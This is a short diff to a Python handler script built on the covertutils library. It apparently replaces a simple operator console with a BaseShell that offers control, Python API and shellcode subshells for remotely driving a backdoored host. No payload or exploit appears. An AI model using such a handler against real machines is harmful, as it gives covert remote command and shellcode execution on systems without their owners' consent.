@@ -1,7 +1,9 @@
 #!/usr/bin/env python
 from covertutils.handlers import BaseHandler
 from covertutils.orchestration import SimpleOrchestrator
-from covertutils.shells import TextShell
+
+from covertutils.shells.baseshell import BaseShell
+from covertutils.shells.subshells import SimpleSubShell, ShellcodeSubShell, PythonAPISubShell
 
 import sys
 import socket
@@ -53,12 +55,5 @@ class MyHandler( BaseHandler ) :
 
 handler = MyHandler( recv, send, orch )
 
-# while True :
-#
-# 	if synchronized :
-# 		c = raw_input("(%s:%d) $ " % addr)
-# 		handle.sendAdHoc( c, 'control' )
-# 	sleep(0.1)
-
-shell = PrintShell(handler, prompt = "(%s:%d) [stream:{0}]$ " % addr)
-shell.cmdloop()
+shell = BaseShell(handler, subshells = {'control' : SimpleSubShell, 'python' : PythonAPISubShell, 'main' : (SimpleSubShell, {'prompt_templ':'[{stream}]> '} ), 'shellcode' : ShellcodeSubShell } )
+shell.start()
